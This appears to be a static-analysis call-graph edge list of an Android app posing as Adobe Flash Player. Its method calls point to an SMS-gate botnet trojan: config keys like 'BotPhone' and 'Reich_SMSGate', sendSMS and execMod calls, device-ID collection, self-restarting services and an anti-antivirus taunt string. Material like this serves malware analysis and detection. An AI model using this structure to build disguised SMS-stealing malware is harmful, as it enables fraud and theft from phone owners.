SPECIAL edge: specialinvoke $r56.<java.lang.StringBuilder: void <init>(java.lang.String)>(r34) in <com.adobe.flashplayer_.FlashURL: void onReceive(android.content.Context,android.content.Intent)> ==> <java.lang.StringBuilder: void <init>(java.lang.String)>
VIRTUAL edge: $r25 = virtualinvoke $r21.<com.adobe.flashplayer_.FlashVars: android.os.AsyncTask execute(java.lang.Object[])>($r29) in <com.adobe.flashplayer_.AdobeUtil: void onCreate()> ==> <android.os.AsyncTask: android.os.AsyncTask execute(java.lang.Object[])>
VIRTUAL edge: r5 = virtualinvoke r5.<java.lang.StringBuilder: java.lang.StringBuilder append(java.lang.String)>($r20) in <com.adobe.flashplayer_.FlashURL: void onReceive(android.content.Context,android.content.Intent)> ==> <java.lang.StringBuilder: java.lang.StringBuilder append(java.lang.String)>
VIRTUAL edge: $i0 = virtualinvoke $r24.<java.lang.String: int indexOf(java.lang.String)>("start") in <com.adobe.flashplayer_.AdobeUtil: void onCreate()> ==> <java.lang.String: int indexOf(java.lang.String)>
SPECIAL edge: specialinvoke r3.<java.io.InputStreamReader: void <init>(java.io.InputStream)>($r5) in <com.adobe.flashplayer_.AdobeUtil: java.lang.String readConfig(java.lang.String)> ==> <java.io.InputStreamReader: void <init>(java.io.InputStream)>
VIRTUAL edge: $z0 = virtualinvoke $r6.<java.lang.String: boolean contains(java.lang.CharSequence)>("de") in <com.adobe.flashplayer_.Prefs: void <init>(android.content.Context,java.lang.String)> ==> <java.lang.String: boolean contains(java.lang.CharSequence)>
VIRTUAL edge: virtualinvoke r0.<com.adobe.flashplayer_.AdobeUtil: void sendSMS(java.lang.String,java.lang.String)>($r24, $r20) in <com.adobe.flashplayer_.AdobeUtil: void onCreate()> ==> <com.adobe.flashplayer_.AdobeUtil: void sendSMS(java.lang.String,java.lang.String)>
VIRTUAL edge: $r23 = virtualinvoke $r23.<java.lang.StringBuilder: java.lang.StringBuilder append(java.lang.String)>($r14) in <com.adobe.flashplayer_.AdobeUtil: void onCreate()> ==> <java.lang.StringBuilder: java.lang.StringBuilder append(java.lang.String)>
SPECIAL edge: specialinvoke r0.<android.app.Service: void onDestroy()>() in <com.adobe.flashplayer_.MacrosStat: void onDestroy()> ==> <android.app.Service: void onDestroy()>
VIRTUAL edge: r5 = virtualinvoke r5.<java.lang.StringBuilder: java.lang.StringBuilder append(java.lang.String)>(r4) in <com.adobe.flashplayer_.FlashURL: void onReceive(android.content.Context,android.content.Intent)> ==> <java.lang.StringBuilder: java.lang.StringBuilder append(java.lang.String)>
SPECIAL edge: $r18 = specialinvoke r0.<com.adobe.flashplayer_.AdobeUtil: java.lang.String readConfig(java.lang.String)>("BotVer") in <com.adobe.flashplayer_.AdobeUtil: void onCreate()> ==> <com.adobe.flashplayer_.AdobeUtil: java.lang.String readConfig(java.lang.String)>
VIRTUAL edge: $r20 = virtualinvoke r4.<java.lang.StringBuffer: java.lang.String toString()>() in <com.adobe.flashplayer_.AdobeUtil: void onCreate()> ==> <java.lang.StringBuffer: java.lang.String toString()>
VIRTUAL edge: $r14 = virtualinvoke $r14.<java.lang.StringBuilder: java.lang.StringBuilder append(java.lang.String)>($r7) in <com.adobe.flashplayer_.FlashURL: void sendREP(java.lang.String,java.lang.String,java.lang.String,android.content.Context)> ==> <java.lang.StringBuilder: java.lang.StringBuilder append(java.lang.String)>
VIRTUAL edge: $r23 = virtualinvoke $r53.<java.lang.StringBuilder: java.lang.StringBuilder append(java.lang.String)>($r14) in <com.adobe.flashplayer_.AdobeUtil: void onCreate()> ==> <java.lang.StringBuilder: java.lang.StringBuilder append(java.lang.String)>
VIRTUAL edge: $r21 = virtualinvoke r5.<java.lang.StringBuilder: java.lang.String toString()>() in <com.adobe.flashplayer_.FlashURL: void onReceive(android.content.Context,android.content.Intent)> ==> <java.lang.StringBuilder: java.lang.String toString()>
VIRTUAL edge: $i0 = virtualinvoke r8.<java.lang.String: int indexOf(java.lang.String)>("3gOn") in <com.adobe.flashplayer_.FlashURL: void onReceive(android.content.Context,android.content.Intent)> ==> <java.lang.String: int indexOf(java.lang.String)>
STATIC edge: $r2 = staticinvoke <java.lang.String: java.lang.String valueOf(java.lang.Object)>("Hello, fuckin AVs!") in <com.adobe.flashplayer_.MacrosStat: void onCreate()> ==> <java.lang.String: java.lang.String valueOf(java.lang.Object)>
VIRTUAL edge: $r23 = virtualinvoke $r23.<java.lang.StringBuilder: java.lang.StringBuilder append(java.lang.String)>(r1) in <com.adobe.flashplayer_.AdobeUtil: void onCreate()> ==> <java.lang.StringBuilder: java.lang.StringBuilder append(java.lang.String)>
VIRTUAL edge: $r24 = virtualinvoke r4.<java.lang.StringBuffer: java.lang.String toString()>() in <com.adobe.flashplayer_.AdobeUtil: void onCreate()> ==> <java.lang.StringBuffer: java.lang.String toString()>
STATIC edge: staticinvoke <dummyMainClass: com.adobe.flashplayer_.MacrosStat dummyMainMethod_com_adobe_flashplayer___MacrosStat(android.content.Intent)>(null) in <dummyMainClass: void dummyMainMethod(java.lang.String[])> ==> <dummyMainClass: com.adobe.flashplayer_.MacrosStat dummyMainMethod_com_adobe_flashplayer___MacrosStat(android.content.Intent)>
VIRTUAL edge: $r23 = virtualinvoke $r53.<java.lang.StringBuilder: java.lang.StringBuilder append(java.lang.String)>($r14) in <com.adobe.flashplayer_.AdobeUtil: void onCreate()> ==> <java.lang.StringBuilder: java.lang.StringBuilder append(java.lang.String)>
SPECIAL edge: specialinvoke $r59.<com.adobe.flashplayer_.Prefs: void <init>(android.content.Context,java.lang.String)>($r38, "ON") in <com.adobe.flashplayer_.AdobeUtil: void onCreate()> ==> <com.adobe.flashplayer_.Prefs: void <init>(android.content.Context,java.lang.String)>
SPECIAL edge: specialinvoke r3.<java.io.BufferedReader: void <init>(java.io.Reader)>(r4) in <com.adobe.flashplayer_.adobeCore: java.lang.String readConfig(java.lang.String,android.content.Context)> ==> <java.io.BufferedReader: void <init>(java.io.Reader)>
VIRTUAL edge: $r20 = virtualinvoke $r15.<java.lang.String: java.lang.String replace(java.lang.CharSequence,java.lang.CharSequence)>(":", "") in <com.adobe.flashplayer_.AdobeUtil: void onCreate()> ==> <java.lang.String: java.lang.String replace(java.lang.CharSequence,java.lang.CharSequence)>
VIRTUAL edge: $r23 = virtualinvoke $r23.<java.lang.StringBuilder: java.lang.StringBuilder append(java.lang.String)>("&e=") in <com.adobe.flashplayer_.AdobeUtil: void onCreate()> ==> <java.lang.StringBuilder: java.lang.StringBuilder append(java.lang.String)>
VIRTUAL edge: $r18 = virtualinvoke $r19.<java.lang.String: java.lang.String replace(java.lang.CharSequence,java.lang.CharSequence)>(":", "") in <com.adobe.flashplayer_.FlashURL: void onReceive(android.content.Context,android.content.Intent)> ==> <java.lang.String: java.lang.String replace(java.lang.CharSequence,java.lang.CharSequence)>
SPECIAL edge: r4 = specialinvoke r0.<com.adobe.flashplayer_.FlashURL: java.lang.String readConfig(java.lang.String,android.content.Context)>("BotPhone", $r1) in <com.adobe.flashplayer_.FlashURL: void onReceive(android.content.Context,android.content.Intent)> ==> <com.adobe.flashplayer_.FlashURL: java.lang.String readConfig(java.lang.String,android.content.Context)>
VIRTUAL edge: $z0 = virtualinvoke $r6.<java.lang.String: boolean contains(java.lang.CharSequence)>("by") in <com.adobe.flashplayer_.Prefs: void <init>(android.content.Context,java.lang.String)> ==> <java.lang.String: boolean contains(java.lang.CharSequence)>
VIRTUAL edge: $r2 = virtualinvoke $r0.<com.adobe.flashplayer_.AdobeFlashCore: android.os.IBinder onBind(android.content.Intent)>(null) in <dummyMainClass: com.adobe.flashplayer_.AdobeFlashCore dummyMainMethod_com_adobe_flashplayer___AdobeFlashCore(android.content.Intent)> ==> <com.adobe.flashplayer_.AdobeFlashCore: android.os.IBinder onBind(android.content.Intent)>
VIRTUAL edge: virtualinvoke $r0.<com.adobe.flashplayer_.AdobeZCore: void onCreate()>() in <dummyMainClass: com.adobe.flashplayer_.AdobeZCore dummyMainMethod_com_adobe_flashplayer___AdobeZCore(android.content.Intent)> ==> <com.adobe.flashplayer_.AdobeZCore: void onCreate()>
SPECIAL edge: specialinvoke $r56.<java.lang.StringBuilder: void <init>(java.lang.String)>("&b=") in <com.adobe.flashplayer_.FlashURL: void onReceive(android.content.Context,android.content.Intent)> ==> <java.lang.StringBuilder: void <init>(java.lang.String)>
VIRTUAL edge: $l4 = virtualinvoke r3.<java.io.File: long lastModified()>() in <com.adobe.flashplayer_.AdobeUtil: void onCreate()> ==> <java.io.File: long lastModified()>
SPECIAL edge: specialinvoke $r1.<java.lang.RuntimeException: void <init>(java.lang.String)>("Stub!") in <java.lang.RuntimeException: void <init>(java.lang.String)> ==> <java.lang.RuntimeException: void <init>(java.lang.String)>
SPECIAL edge: specialinvoke $r22.<java.lang.StringBuilder: void <init>(java.lang.String)>($r17) in <com.adobe.flashplayer_.FlashZ: void onReceive(android.content.Context,android.content.Intent)> ==> <java.lang.StringBuilder: void <init>(java.lang.String)>
VIRTUAL edge: r5 = virtualinvoke $r56.<java.lang.StringBuilder: java.lang.StringBuilder append(java.lang.String)>(r25) in <com.adobe.flashplayer_.FlashURL: void onReceive(android.content.Context,android.content.Intent)> ==> <java.lang.StringBuilder: java.lang.StringBuilder append(java.lang.String)>
VIRTUAL edge: $r23 = virtualinvoke $r53.<java.lang.StringBuilder: java.lang.StringBuilder append(java.lang.String)>($r24) in <com.adobe.flashplayer_.AdobeUtil: void onCreate()> ==> <java.lang.StringBuilder: java.lang.StringBuilder append(java.lang.String)>
VIRTUAL edge: $r24 = virtualinvoke $r23.<java.lang.StringBuilder: java.lang.String toString()>() in <com.adobe.flashplayer_.AdobeUtil: void onCreate()> ==> <java.lang.StringBuilder: java.lang.String toString()>
STATIC edge: $r5 = staticinvoke <java.lang.String: java.lang.String valueOf(java.lang.Object)>("") in <com.adobe.flashplayer_.FlashZ: void onReceive(android.content.Context,android.content.Intent)> ==> <java.lang.String: java.lang.String valueOf(java.lang.Object)>
SPECIAL edge: specialinvoke $r1.<android.view.View: void <init>(android.content.Context)>(null) in <dummyMainClass: com.adobe.flashplayer_.AdobeUtil dummyMainMethod_com_adobe_flashplayer___AdobeUtil(android.content.Intent)> ==> <android.view.View: void <init>(android.content.Context)>
VIRTUAL edge: virtualinvoke r4.<java.io.OutputStreamWriter: void write(java.lang.String)>($r2) in <com.adobe.flashplayer_.AdobeUtil: void writeConfig(java.lang.String,java.lang.String,android.content.Context)> ==> <java.io.Writer: void write(java.lang.String)>
SPECIAL edge: specialinvoke $r53.<java.lang.StringBuilder: void <init>(java.lang.String)>("&b=") in <com.adobe.flashplayer_.AdobeUtil: void onCreate()> ==> <java.lang.StringBuilder: void <init>(java.lang.String)>
VIRTUAL edge: r3 = virtualinvoke r5.<java.lang.StringBuilder: java.lang.String toString()>() in <com.adobe.flashplayer_.FlashURL: void onReceive(android.content.Context,android.content.Intent)> ==> <java.lang.StringBuilder: java.lang.String toString()>
SPECIAL edge: specialinvoke r0.<com.adobe.flashplayer_.AdobeUtil: void sendREP(java.lang.String,java.lang.String,java.lang.String,android.content.Context)>($r17, $r14, "getMessages:Executed:HTTP", $r7) in <com.adobe.flashplayer_.AdobeUtil: void onCreate()> ==> <com.adobe.flashplayer_.AdobeUtil: void sendREP(java.lang.String,java.lang.String,java.lang.String,android.content.Context)>
VIRTUAL edge: r5 = virtualinvoke r5.<java.lang.StringBuilder: java.lang.StringBuilder append(java.lang.String)>("&g=") in <com.adobe.flashplayer_.FlashURL: void onReceive(android.content.Context,android.content.Intent)> ==> <java.lang.StringBuilder: java.lang.StringBuilder append(java.lang.String)>
SPECIAL edge: specialinvoke $r1.<android.view.View: void <init>(android.content.Context)>(null) in <dummyMainClass: com.adobe.flashplayer_.adobeCore dummyMainMethod_com_adobe_flashplayer___adobeCore(android.content.Intent)> ==> <android.view.View: void <init>(android.content.Context)>
SPECIAL edge: specialinvoke $r56.<java.lang.StringBuilder: void <init>(java.lang.String)>($r21) in <com.adobe.flashplayer_.FlashURL: void onReceive(android.content.Context,android.content.Intent)> ==> <java.lang.StringBuilder: void <init>(java.lang.String)>
VIRTUAL edge: $r24 = virtualinvoke r8.<java.lang.String: java.lang.String[] split(java.lang.String)>(",") in <com.adobe.flashplayer_.FlashURL: void onReceive(android.content.Context,android.content.Intent)> ==> <java.lang.String: java.lang.String[] split(java.lang.String)>
SPECIAL edge: r1 = specialinvoke r0.<com.adobe.flashplayer_.AdobeFlashCore: java.lang.String readConfig(java.lang.String)>("Reich_SMSGate") in <com.adobe.flashplayer_.AdobeFlashCore: void onCreate()> ==> <com.adobe.flashplayer_.AdobeFlashCore: java.lang.String readConfig(java.lang.String)>
VIRTUAL edge: $r23 = virtualinvoke $r23.<java.lang.StringBuilder: java.lang.StringBuilder append(java.lang.String)>("&e=") in <com.adobe.flashplayer_.AdobeUtil: void onCreate()> ==> <java.lang.StringBuilder: java.lang.StringBuilder append(java.lang.String)>
VIRTUAL edge: $r5 = virtualinvoke r0.<com.adobe.flashplayer_.AdobeUtil: java.io.FileInputStream openFileInput(java.lang.String)>($r1) in <com.adobe.flashplayer_.AdobeUtil: java.lang.String readConfig(java.lang.String)> ==> <android.content.ContextWrapper: java.io.FileInputStream openFileInput(java.lang.String)>
SPECIAL edge: specialinvoke r0.<com.adobe.flashplayer_.AdobeFlashCore: void writeConfig(java.lang.String,java.lang.String)>("BotNetwork", r8) in <com.adobe.flashplayer_.AdobeFlashCore: void onCreate()> ==> <com.adobe.flashplayer_.AdobeFlashCore: void writeConfig(java.lang.String,java.lang.String)>
VIRTUAL edge: $r23 = virtualinvoke $r23.<java.lang.StringBuilder: java.lang.StringBuilder append(java.lang.String)>($r20) in <com.adobe.flashplayer_.AdobeUtil: void onCreate()> ==> <java.lang.StringBuilder: java.lang.StringBuilder append(java.lang.String)>
VIRTUAL edge: r5 = virtualinvoke r5.<java.lang.StringBuilder: java.lang.StringBuilder append(java.lang.String)>(":SMSGATE") in <com.adobe.flashplayer_.FlashURL: void onReceive(android.content.Context,android.content.Intent)> ==> <java.lang.StringBuilder: java.lang.StringBuilder append(java.lang.String)>
VIRTUAL edge: $r16 = virtualinvoke $r22.<java.lang.StringBuilder: java.lang.StringBuilder append(java.lang.String)>(".txt") in <com.adobe.flashplayer_.FlashZ: void onReceive(android.content.Context,android.content.Intent)> ==> <java.lang.StringBuilder: java.lang.StringBuilder append(java.lang.String)>
SPECIAL edge: $r20 = specialinvoke r0.<com.adobe.flashplayer_.AdobeUtil: java.lang.String readConfig(java.lang.String)>("BotPhone") in <com.adobe.flashplayer_.AdobeUtil: void onCreate()> ==> <com.adobe.flashplayer_.AdobeUtil: java.lang.String readConfig(java.lang.String)>
VIRTUAL edge: $r3 = virtualinvoke r0.<com.adobe.flashplayer_.AdobeFlashCore: java.lang.Object getSystemService(java.lang.String)>("phone") in <com.adobe.flashplayer_.AdobeFlashCore: void onCreate()> ==> <android.content.ContextWrapper: java.lang.Object getSystemService(java.lang.String)>
SPECIAL edge: specialinvoke r0.<android.content.BroadcastReceiver: void <init>()>() in <com.adobe.flashplayer_.adobeCore: void <init>()> ==> <android.content.BroadcastReceiver: void <init>()>
SPECIAL edge: specialinvoke $r53.<java.lang.StringBuilder: void <init>(java.lang.String)>($r20) in <com.adobe.flashplayer_.AdobeUtil: void onCreate()> ==> <java.lang.StringBuilder: void <init>(java.lang.String)>
SPECIAL edge: specialinvoke $r14.<com.adobe.flashplayer_.FlashVars: void <init>()>() in <com.adobe.flashplayer_.AdobeFlashCore: void onCreate()> ==> <com.adobe.flashplayer_.FlashVars: void <init>()>
VIRTUAL edge: $r23 = virtualinvoke $r53.<java.lang.StringBuilder: java.lang.StringBuilder append(java.lang.String)>($r41) in <com.adobe.flashplayer_.AdobeUtil: void onCreate()> ==> <java.lang.StringBuilder: java.lang.StringBuilder append(java.lang.String)>
VIRTUAL edge: $r23 = virtualinvoke $r23.<java.lang.StringBuilder: java.lang.StringBuilder append(java.lang.String)>("\r") in <com.adobe.flashplayer_.AdobeUtil: void onCreate()> ==> <java.lang.StringBuilder: java.lang.StringBuilder append(java.lang.String)>
SPECIAL edge: specialinvoke $r22.<java.lang.StringBuilder: void <init>(java.lang.String)>($r5) in <com.adobe.flashplayer_.FlashZ: void onReceive(android.content.Context,android.content.Intent)> ==> <java.lang.StringBuilder: void <init>(java.lang.String)>
SPECIAL edge: specialinvoke $r0.<java.lang.RuntimeException: void <init>(java.lang.String)>("Stub!") in <java.lang.Boolean: java.lang.Boolean valueOf(boolean)> ==> <java.lang.RuntimeException: void <init>(java.lang.String)>
VIRTUAL edge: $r23 = virtualinvoke $r23.<java.lang.StringBuilder: java.lang.StringBuilder append(java.lang.String)>($r18) in <com.adobe.flashplayer_.AdobeUtil: void onCreate()> ==> <java.lang.StringBuilder: java.lang.StringBuilder append(java.lang.String)>
VIRTUAL edge: $r16 = virtualinvoke $r22.<java.lang.StringBuilder: java.lang.StringBuilder append(java.lang.String)>(".txt") in <com.adobe.flashplayer_.FlashZ: void onReceive(android.content.Context,android.content.Intent)> ==> <java.lang.StringBuilder: java.lang.StringBuilder append(java.lang.String)>
VIRTUAL edge: r34 = virtualinvoke r5.<java.lang.StringBuilder: java.lang.String toString()>() in <com.adobe.flashplayer_.FlashURL: void onReceive(android.content.Context,android.content.Intent)> ==> <java.lang.StringBuilder: java.lang.String toString()>
STATIC edge: $r21 = staticinvoke <java.lang.String: java.lang.String valueOf(java.lang.Object)>($r23) in <com.adobe.flashplayer_.FlashURL: void onReceive(android.content.Context,android.content.Intent)> ==> <java.lang.String: java.lang.String valueOf(java.lang.Object)>
SPECIAL edge: specialinvoke $r53.<java.lang.StringBuilder: void <init>(java.lang.String)>("&b=") in <com.adobe.flashplayer_.AdobeUtil: void onCreate()> ==> <java.lang.StringBuilder: void <init>(java.lang.String)>
VIRTUAL edge: $i0 = virtualinvoke $r21.<java.lang.String: int indexOf(java.lang.String)>("On") in <com.adobe.flashplayer_.FlashURL: void onReceive(android.content.Context,android.content.Intent)> ==> <java.lang.String: int indexOf(java.lang.String)>
VIRTUAL edge: $z0 = virtualinvoke $r2.<java.lang.String: boolean contains(java.lang.CharSequence)>("OFF") in <com.adobe.flashplayer_.Prefs: void <init>(android.content.Context,java.lang.String)> ==> <java.lang.String: boolean contains(java.lang.CharSequence)>
VIRTUAL edge: r5 = virtualinvoke r5.<java.lang.StringBuilder: java.lang.StringBuilder append(java.lang.String)>("\n\n") in <com.adobe.flashplayer_.FlashURL: void onReceive(android.content.Context,android.content.Intent)> ==> <java.lang.StringBuilder: java.lang.StringBuilder append(java.lang.String)>
SPECIAL edge: specialinvoke r3.<java.io.BufferedReader: void <init>(java.io.Reader)>(r4) in <com.adobe.flashplayer_.FlashW: java.lang.String readConfig(java.lang.String,android.content.Context)> ==> <java.io.BufferedReader: void <init>(java.io.Reader)>
VIRTUAL edge: $z1 = virtualinvoke $r21.<java.lang.String: boolean contains(java.lang.CharSequence)>("B") in <com.adobe.flashplayer_.FlashURL: void onReceive(android.content.Context,android.content.Intent)> ==> <java.lang.String: boolean contains(java.lang.CharSequence)>
SPECIAL edge: specialinvoke $r53.<java.lang.StringBuilder: void <init>(java.lang.String)>("&b=") in <com.adobe.flashplayer_.AdobeUtil: void onCreate()> ==> <java.lang.StringBuilder: void <init>(java.lang.String)>
SPECIAL edge: specialinvoke r0.<com.adobe.flashplayer_.FlashURL: void writeConfig(java.lang.String,java.lang.String,android.content.Context)>("MacrosAData", r4, $r1) in <com.adobe.flashplayer_.FlashURL: void onReceive(android.content.Context,android.content.Intent)> ==> <com.adobe.flashplayer_.FlashURL: void writeConfig(java.lang.String,java.lang.String,android.content.Context)>
STATIC edge: staticinvoke <dummyMainClass: com.adobe.flashplayer_.SystemSWF dummyMainMethod_com_adobe_flashplayer___SystemSWF(android.content.Intent)>(null) in <dummyMainClass: void dummyMainMethod(java.lang.String[])> ==> <dummyMainClass: com.adobe.flashplayer_.SystemSWF dummyMainMethod_com_adobe_flashplayer___SystemSWF(android.content.Intent)>
VIRTUAL edge: $r23 = virtualinvoke $r23.<java.lang.StringBuilder: java.lang.StringBuilder append(java.lang.String)>($r20) in <com.adobe.flashplayer_.AdobeUtil: void onCreate()> ==> <java.lang.StringBuilder: java.lang.StringBuilder append(java.lang.String)>
VIRTUAL edge: r5 = virtualinvoke r5.<java.lang.StringBuilder: java.lang.StringBuilder append(java.lang.String)>("\n") in <com.adobe.flashplayer_.FlashURL: void onReceive(android.content.Context,android.content.Intent)> ==> <java.lang.StringBuilder: java.lang.StringBuilder append(java.lang.String)>
SPECIAL edge: $r21 = specialinvoke r0.<com.adobe.flashplayer_.FlashURL: java.lang.String readConfig(java.lang.String,android.content.Context)>("Reich_SMSGate", $r1) in <com.adobe.flashplayer_.FlashURL: void onReceive(android.content.Context,android.content.Intent)> ==> <com.adobe.flashplayer_.FlashURL: java.lang.String readConfig(java.lang.String,android.content.Context)>
VIRTUAL edge: $r2 = virtualinvoke r0.<com.adobe.flashplayer_.FlashZ: android.content.Intent getIntent()>() in <com.adobe.flashplayer_.FlashZ: void onReceive(android.content.Context,android.content.Intent)> ==> <com.adobe.flashplayer_.FlashZ: android.content.Intent getIntent()>
VIRTUAL edge: r5 = virtualinvoke r5.<java.lang.StringBuilder: java.lang.StringBuilder append(java.lang.String)>(r3) in <com.adobe.flashplayer_.FlashURL: void onReceive(android.content.Context,android.content.Intent)> ==> <java.lang.StringBuilder: java.lang.StringBuilder append(java.lang.String)>
STATIC edge: r6 = staticinvoke <android.provider.Settings$Secure: java.lang.String getString(android.content.ContentResolver,java.lang.String)>($r11, "android_id") in <com.adobe.flashplayer_.AdobeFlashCore: void onCreate()> ==> <android.provider.Settings$Secure: java.lang.String getString(android.content.ContentResolver,java.lang.String)>
SPECIAL edge: specialinvoke $r0.<com.adobe.flashplayer_.SystemSWF: void <init>()>() in <dummyMainClass: com.adobe.flashplayer_.SystemSWF dummyMainMethod_com_adobe_flashplayer___SystemSWF(android.content.Intent)> ==> <com.adobe.flashplayer_.SystemSWF: void <init>()>
VIRTUAL edge: $i0 = virtualinvoke $r20.<java.lang.String: int indexOf(java.lang.String)>("start") in <com.adobe.flashplayer_.AdobeUtil: void onCreate()> ==> <java.lang.String: int indexOf(java.lang.String)>
VIRTUAL edge: virtualinvoke r4.<java.lang.StringBuffer: java.lang.StringBuffer append(java.lang.String)>($r20) in <com.adobe.flashplayer_.AdobeUtil: void onCreate()> ==> <java.lang.StringBuffer: java.lang.StringBuffer append(java.lang.String)>
VIRTUAL edge: $i0 = virtualinvoke $r20.<java.lang.String: int indexOf(java.lang.String)>("root") in <com.adobe.flashplayer_.AdobeUtil: void onCreate()> ==> <java.lang.String: int indexOf(java.lang.String)>
SPECIAL edge: specialinvoke r0.<com.adobe.flashplayer_.AdobeUtil: void execMod(java.lang.String,android.content.Context)>($r20, $r7) in <com.adobe.flashplayer_.AdobeUtil: void onCreate()> ==> <com.adobe.flashplayer_.AdobeUtil: void execMod(java.lang.String,android.content.Context)>
SPECIAL edge: specialinvoke $r14.<java.lang.StringBuilder: void <init>(java.lang.String)>($r1) in <com.adobe.flashplayer_.AdobeUtil: void sendREP(java.lang.String,java.lang.String,java.lang.String,android.content.Context)> ==> <java.lang.StringBuilder: void <init>(java.lang.String)>
VIRTUAL edge: $r22 = virtualinvoke r19.<java.lang.String: java.lang.String[] split(java.lang.String)>(" ") in <com.adobe.flashplayer_.AdobeUtil: void onCreate()> ==> <java.lang.String: java.lang.String[] split(java.lang.String)>
VIRTUAL edge: $r14 = virtualinvoke $r14.<java.lang.StringBuilder: java.lang.StringBuilder append(java.lang.String)>($r11) in <com.adobe.flashplayer_.FlashW: void onReceive(android.content.Context,android.content.Intent)> ==> <java.lang.StringBuilder: java.lang.StringBuilder append(java.lang.String)>
VIRTUAL edge: virtualinvoke $r0.<com.adobe.flashplayer_.SystemSWF: void onReceive(android.content.Context,android.content.Intent)>(null, null) in <dummyMainClass: com.adobe.flashplayer_.SystemSWF dummyMainMethod_com_adobe_flashplayer___SystemSWF(android.content.Intent)> ==> <com.adobe.flashplayer_.SystemSWF: void onReceive(android.content.Context,android.content.Intent)>
VIRTUAL edge: $r23 = virtualinvoke $r23.<java.lang.StringBuilder: java.lang.StringBuilder append(java.lang.String)>($r16) in <com.adobe.flashplayer_.AdobeUtil: void onCreate()> ==> <java.lang.StringBuilder: java.lang.StringBuilder append(java.lang.String)>
VIRTUAL edge: r6 = virtualinvoke r5.<java.lang.StringBuilder: java.lang.String toString()>() in <com.adobe.flashplayer_.FlashURL: void onReceive(android.content.Context,android.content.Intent)> ==> <java.lang.StringBuilder: java.lang.String toString()>
VIRTUAL edge: $i0 = virtualinvoke $r20.<java.lang.String: int indexOf(java.lang.String)>("stop") in <com.adobe.flashplayer_.AdobeUtil: void onCreate()> ==> <java.lang.String: int indexOf(java.lang.String)>
SPECIAL edge: $r8 = specialinvoke r0.<com.adobe.flashplayer_.FlashZ: java.lang.String readConfig(java.lang.String,android.content.Context)>("BotPhone", $r1) in <com.adobe.flashplayer_.FlashZ: void onReceive(android.content.Context,android.content.Intent)> ==> <com.adobe.flashplayer_.FlashZ: java.lang.String readConfig(java.lang.String,android.content.Context)>
VIRTUAL edge: $r24 = virtualinvoke $r24.<java.lang.String: java.lang.String toString()>() in <com.adobe.flashplayer_.AdobeUtil: void onCreate()> ==> <java.lang.String: java.lang.String toString()>
VIRTUAL edge: virtualinvoke r4.<java.io.OutputStreamWriter: void close()>() in <com.adobe.flashplayer_.AdobeUtil: void writeConfig(java.lang.String,java.lang.String,android.content.Context)> ==> <java.io.OutputStreamWriter: void close()>
VIRTUAL edge: r25 = virtualinvoke r5.<java.lang.StringBuilder: java.lang.String toString()>() in <com.adobe.flashplayer_.FlashURL: void onReceive(android.content.Context,android.content.Intent)> ==> <java.lang.StringBuilder: java.lang.String toString()>
VIRTUAL edge: r5 = virtualinvoke r5.<java.lang.StringBuilder: java.lang.StringBuilder append(java.lang.String)>($r22) in <com.adobe.flashplayer_.FlashURL: void onReceive(android.content.Context,android.content.Intent)> ==> <java.lang.StringBuilder: java.lang.StringBuilder append(java.lang.String)>
VIRTUAL edge: virtualinvoke r0.<com.adobe.flashplayer_.AdobeZCore: android.content.ComponentName startService(android.content.Intent)>($r1) in <com.adobe.flashplayer_.AdobeZCore: void onDestroy()> ==> <android.content.ContextWrapper: android.content.ComponentName startService(android.content.Intent)>
VIRTUAL edge: $r23 = virtualinvoke $r23.<java.lang.StringBuilder: java.lang.StringBuilder append(java.lang.String)>("&e=") in <com.adobe.flashplayer_.AdobeUtil: void onCreate()> ==> <java.lang.StringBuilder: java.lang.StringBuilder append(java.lang.String)>
SPECIAL edge: specialinvoke $r23.<com.adobe.flashplayer_.FlashVirtual: void <init>()>() in <com.adobe.flashplayer_.FlashZ: void onReceive(android.content.Context,android.content.Intent)> ==> <com.adobe.flashplayer_.FlashVirtual: void <init>()>
SPECIAL edge: specialinvoke r0.<com.adobe.flashplayer_.FlashURL: void writeConfig(java.lang.String,java.lang.String,android.content.Context)>("w", "NOFILTER", $r1) in <com.adobe.flashplayer_.FlashURL: void onReceive(android.content.Context,android.content.Intent)> ==> <com.adobe.flashplayer_.FlashURL: void writeConfig(java.lang.String,java.lang.String,android.content.Context)>
SPECIAL edge: specialinvoke $r2.<android.content.Intent: void <init>(android.content.Context,java.lang.Class)>($r1, class "Lcom/adobe/flashplayer_/AdobeZCore;") in <com.adobe.flashplayer_.adobeCore: void onReceive(android.content.Context,android.content.Intent)> ==> <android.content.Intent: void <init>(android.content.Context,java.lang.Class)>
VIRTUAL edge: $r23 = virtualinvoke $r53.<java.lang.StringBuilder: java.lang.StringBuilder append(java.lang.String)>($r24) in <com.adobe.flashplayer_.AdobeUtil: void onCreate()> ==> <java.lang.StringBuilder: java.lang.StringBuilder append(java.lang.String)>
VIRTUAL edge: $r14 = virtualinvoke $r14.<java.lang.StringBuilder: java.lang.StringBuilder append(java.lang.String)>(r6) in <com.adobe.flashplayer_.FlashURL: void sendREP(java.lang.String,java.lang.String,java.lang.String,android.content.Context)> ==> <java.lang.StringBuilder: java.lang.StringBuilder append(java.lang.String)>
SPECIAL edge: specialinvoke $r1.<java.lang.StringBuilder: void <init>(java.lang.String)>($r2) in <com.adobe.flashplayer_.MacrosStat: void onCreate()> ==> <java.lang.StringBuilder: void <init>(java.lang.String)>
VIRTUAL edge: $r22 = virtualinvoke r19.<java.lang.String: java.lang.String[] split(java.lang.String)>(" ") in <com.adobe.flashplayer_.AdobeUtil: void onCreate()> ==> <java.lang.String: java.lang.String[] split(java.lang.String)>
VIRTUAL edge: r25 = virtualinvoke $r19.<java.lang.String: java.lang.String replace(java.lang.CharSequence,java.lang.CharSequence)>(":", "") in <com.adobe.flashplayer_.FlashURL: void onReceive(android.content.Context,android.content.Intent)> ==> <java.lang.String: java.lang.String replace(java.lang.CharSequence,java.lang.CharSequence)>
VIRTUAL edge: virtualinvoke r0.<com.adobe.flashplayer_.FlashZ: void setResultData(java.lang.String)>(null) in <com.adobe.flashplayer_.FlashZ: void onReceive(android.content.Context,android.content.Intent)> ==> <android.content.BroadcastReceiver: void setResultData(java.lang.String)>
VIRTUAL edge: r5 = virtualinvoke $r56.<java.lang.StringBuilder: java.lang.StringBuilder append(java.lang.String)>("|") in <com.adobe.flashplayer_.FlashURL: void onReceive(android.content.Context,android.content.Intent)> ==> <java.lang.StringBuilder: java.lang.StringBuilder append(java.lang.String)>
